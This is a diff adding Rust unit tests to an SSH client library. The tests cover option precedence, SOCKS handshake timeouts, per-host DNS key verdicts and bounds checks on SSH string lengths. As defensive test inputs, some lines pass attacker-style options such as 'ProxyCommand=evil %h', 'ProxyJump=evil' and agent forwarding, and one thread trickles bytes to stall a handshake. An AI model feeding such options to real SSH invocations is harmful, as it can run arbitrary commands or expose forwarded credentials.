+    /// what a wrapper pinned.
+    #[test]
+    fn repeated_dash_o_first_wins() {
+        let (cli, o) = resolved(&[
+            "-o",
+            "ForwardAgent=no",
+            "-oForwardX11=no",
+            "-o",
+            "ProxyCommand=none",
+            "-o",
+            "ControlPath=none",
+            "-o",
+            "ForwardAgent=yes",
+            "-o",
+            "ForwardX11 yes",
+            "-o",
+            "ProxyCommand=evil %h",
+            "-o",
+            "ProxyJump=evil",
+            "-o",
+            "ControlPath=/tmp/cm",
+            "-o",
+            "IdentityFile=a",
+            "-o",
+            "IdentityFile=b",
+            "host",
+        ]);
+        assert!(!cli.agent_forward);
+        assert_eq!(o.forward_agent, Some(false));
+        assert_eq!(o.forward_x11, Some(false));
+        assert_eq!(o.proxy_command.as_deref(), Some("none"));
+        assert_eq!(o.proxy_jump, None);
+        assert_eq!(o.control_path_enabled(), None);
+        assert_eq!(o.identity_files, ["a", "b"]);
+        // …and it is still what a configuration file's value yields to.
+        let mut block = puressh::config::SshClientConfig::parse(
+            "ForwardAgent yes\nControlPath /tmp/file\nPort 2222\n",
+        )
+        .unwrap()
+        .lookup("host");
+        apply_extra_o(&mut block, &cli.extra_o).unwrap();
+        assert_eq!(block.forward_agent, Some(false));
+        assert_eq!(block.control_path_enabled(), None);
+        assert_eq!(block.port, Some(2222));
+        // A bad value is refused even where it would be ignored.
+        let cli = parse_args(&args(&["-oPort=22", "-oPort=nope", "host"])).unwrap();
+        let mut block = puressh::config::ClientOptions::default();
+        assert!(apply_extra_o(&mut block, &cli.extra_o).is_err());
+    }
+
+    /// Flags set their option whatever precedes them (OpenSSH assigns
+    /// unconditionally), and an `-o` after a flag does not change it.
+    #[test]
+    fn flags_and_dash_o_apply_in_order() {
+        use puressh::config::{AddressFamily, ControlMaster};
+        // -a after -o ForwardAgent=yes: off. -o after -a: still off.
+        let (cli, o) = resolved(&["-o", "ForwardAgent=yes", "-a", "host"]);
+        assert!(!cli.agent_forward);
+        assert_eq!(o.forward_agent, Some(false));
+        let (cli, o) = resolved(&["-a", "-o", "ForwardAgent=yes", "host"]);
+        assert!(!cli.agent_forward);
+        assert_eq!(o.forward_agent, Some(false));
+        // -A is on whatever -o says, before or after.
+        assert!(
+            resolved(&["-o", "ForwardAgent=no", "-A", "host"])
+                .0
+                .agent_forward
+        );
+        assert!(
+            resolved(&["-A", "-o", "ForwardAgent=no", "host"])
+                .0
+                .agent_forward
+        );
+        // -x likewise.
+        let (cli, o) = resolved(&["-o", "ForwardX11=yes", "-x", "-oForwardX11=yes", "host"]);
+        assert!(cli.x11_forward.is_none());
+        assert_eq!(o.forward_x11, Some(false));
+        // The last of two flags wins; an earlier -o loses, a later one too.
+        let (_, o) = resolved(&[
+            "-o",
+            "ControlPath=/tmp/o",
+            "-S",
+            "/tmp/a",
+            "-S",
+            "/tmp/b",
+            "-oControlPath=/tmp/late",
+            "-oAddressFamily=inet",
+            "-4",
+            "-6",
+            "-oControlMaster=no",
+            "-M",
+            "host",
+        ]);
+        assert_eq!(o.control_path.as_deref(), Some("/tmp/b"));
+        assert_eq!(o.address_family, Some(AddressFamily::Inet6));
+        assert_eq!(o.control_master, Some(ControlMaster::Yes));
+        // -S none after -o ControlPath: multiplexing off.
+        let (_, o) = resolved(&["-oControlPath=/tmp/o", "-S", "none", "host"]);
+        assert_eq!(o.control_path_enabled(), None);
+        // The first port named wins, -p or -o Port.
+        let (cli, o) = resolved(&["-p", "22", "-p", "2222", "-oPort=23", "host"]);
+        assert_eq!(cli.port.or(o.port), Some(22));
+        let (cli, o) = resolved(&["-oPort=23", "-p", "22", "host"]);
+        assert_eq!(cli.port.or(o.port), Some(23));
+        assert!(parse_args(&args(&["-oPort=23", "-p", "nope", "host"])).is_err());
+        // One -J only, and not with a ProxyCommand given before it.
+        assert!(parse_args(&args(&["-J", "a", "-J", "b", "host"])).is_err());
+        assert!(parse_args(&args(&["-oProxyJump=a", "-J", "b", "host"])).is_err());
+        assert!(parse_args(&args(&["-oProxyCommand=nc %h %p", "-J", "b", "host"])).is_err());
+        let (cli, o) = resolved(&["-J", "a", "-oProxyJump=b", "-oProxyCommand=x", "host"]);
+        assert_eq!(cli.proxy_jump.as_deref(), Some("a"));
+        assert_eq!(o.proxy_jump.as_deref(), Some("a"));
+        assert_eq!(o.proxy_command, None);
+    }
+
+    /// A `-D` client gets a bounded time for its whole SOCKS request,
+    /// silent or trickling, and a served one is left without a timeout.
+    #[test]
+    fn socks_handshake_is_bounded() {
+        use puressh::forwarding::socks::SocksError;
+        use std::time::{Duration, Instant};
+        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+        let addr = listener.local_addr().unwrap();
+        let timed_out = |r: Result<_, SocksError>| match r {
+            Err(SocksError::Io(e)) => {
+                matches!(e.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock)
+            }
+            Ok::<puressh::forwarding::socks::SocksTarget, _>(_) | Err(_) => false,
+        };
+        // Says nothing.
+        let _silent = TcpStream::connect(addr).unwrap();
+        let (mut tcp, _) = listener.accept().unwrap();
+        let start = Instant::now();
+        assert!(timed_out(socks_handshake_within(
+            &mut tcp,
+            Duration::from_millis(150)
+        )));
+        assert!(start.elapsed() < Duration::from_secs(5));
+        // Sends a byte now and then, never the whole request: the bound is
+        // on the handshake, not on each read.
+        let mut slow = TcpStream::connect(addr).unwrap();
+        let (mut tcp, _) = listener.accept().unwrap();
+        let feeder = thread::spawn(move || {
+            // SOCKS5, 255 methods, then method bytes one at a time.
+            let _ = slow.write_all(&[5, 255]);
+            for _ in 0..100 {
+                thread::sleep(Duration::from_millis(40));
+                if slow.write_all(&[9]).is_err() {
+                    break;
+                }
+            }
+        });
+        let start = Instant::now();
+        assert!(timed_out(socks_handshake_within(
+            &mut tcp,
+            Duration::from_millis(300)
+        )));
+        assert!(start.elapsed() < Duration::from_secs(3));
+        drop(tcp);
+        let _ = feeder.join();
+        // A proper request is served, and the timeout is gone afterwards.
+        let mut client = TcpStream::connect(addr).unwrap();
+        let (mut tcp, _) = listener.accept().unwrap();
+        client
+            .write_all(&[5, 1, 0, 5, 1, 0, 1, 192, 0, 2, 7, 0, 80])
+            .unwrap();
+        let target = socks_handshake_within(&mut tcp, Duration::from_secs(10)).unwrap();
+        assert_eq!((target.host.as_str(), target.port), ("192.0.2.7", 80));
+        assert_eq!(tcp.read_timeout().unwrap(), None);
+    }
+
+    /// Each host's key check starts without the previous host's SSHFP
+    /// verdict, whether or not it uses VerifyHostKeyDNS itself.
+    #[test]
+    fn dns_verdict_does_not_carry_over_to_the_next_host() {
+        use std::sync::Mutex;
+        let store = Arc::new(Mutex::new(puressh::known_hosts::KnownHosts::new()));
+        let mut kh = puressh::client::KnownHostsPolicy::strict(store);
+        // The next host: VerifyHostKeyDNS off (the default).
+        install_host_key_checks(
+            &mut kh,
+            &puressh::config::ClientOptions::default(),
+            "next.example",
+            StrictMode::Ask,
+            Vec::new(),
+        );
+        // A jump host matched its SSHFP records…
+        common::set_dns_match(Some(true));
+        let pre = kh.pre_check.clone().expect("pre-check installed");
+        assert_eq!(pre("ssh-ed25519", b"not looked at"), None);
+        // …which says nothing about this one.
+        assert_eq!(common::dns_match(), None);
+    }
+
+    /// A peer-declared string length is checked against what is left
+    /// without being added to anything.
+    #[test]
+    fn ssh_string_lengths_are_bounds_checked() {
+        assert_eq!(
+            split_ssh_string(b"\0\0\0\x03abcde"),
+            Some((&b"abc"[..], &b"de"[..]))
+        );
+        assert_eq!(split_ssh_string(b"\0\0\0\0"), Some((&b""[..], &b""[..])));
+        assert_eq!(split_ssh_string(b"\0\0\0"), None);
+        assert_eq!(split_ssh_string(b"\0\0\0\x04abc"), None);
+        // The largest lengths: `4 + n` would wrap a 32-bit usize.
+        assert_eq!(split_ssh_string(b"\xff\xff\xff\xffabc"), None);
+        assert_eq!(split_ssh_string(b"\xff\xff\xff\xfcabc"), None);
+        assert_eq!(key_blob_type(b"\xff\xff\xff\xfdssh-ed25519"), None);
+        assert_eq!(
+            key_blob_type(b"\0\0\0\x0bssh-ed25519rest").as_deref(),
+            Some("ssh-ed25519")
+        );
     }
 
     #[test]
